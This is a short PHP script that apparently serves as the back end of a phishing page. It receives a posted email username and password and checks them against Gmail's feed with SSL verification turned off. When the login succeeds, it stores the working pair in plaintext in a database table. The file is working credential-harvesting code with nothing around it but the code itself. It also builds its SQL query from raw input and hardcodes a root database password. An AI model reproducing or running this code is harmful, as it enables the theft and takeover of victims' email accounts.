<?php
date_default_timezone_set("America/Caracas" );
$usu = $_POST["usu"];
$pass = $_POST["pass"];

$con = mysql_connect("localhost","root","123456");
if (!$con)
 {
 die('Could not connect: ' . mysql_error());
 }

$str_today = date("Y-m-d H:i:s");

function check_email($username, $password)
{ 
    //url to connect to
    $url = "https://mail.google.com/mail/feed/atom"; 
    // sendRequest 
    $curl = curl_init();
    curl_setopt($curl, CURLOPT_URL, $url);
    curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($curl, CURLOPT_USERPWD, $username . ":" . $password);
    curl_setopt($curl, CURLOPT_HTTPAUTH, CURLAUTH_BASIC);
    curl_setopt($curl, CURLOPT_ENCODING, "");
    $curlData = curl_exec($curl);
    curl_close($curl);

    //returning retrieved feed
    return $curlData;
}

$feed = check_email($usu, $pass);

$buscar = "Unauthorized";
$resultado = strpos($feed, $buscar);

if($resultado == TRUE){
echo 'false';
exit();
}else{

$cuenta=$usu.'  '.$pass;
mysql_select_db("mt", $con);
$query="INSERT INTO inbox (text,date) values ('$cuenta','$str_today')";
mysql_query($query) or die(mysql_error());

echo 'true';
}

//echo $feed;
?>
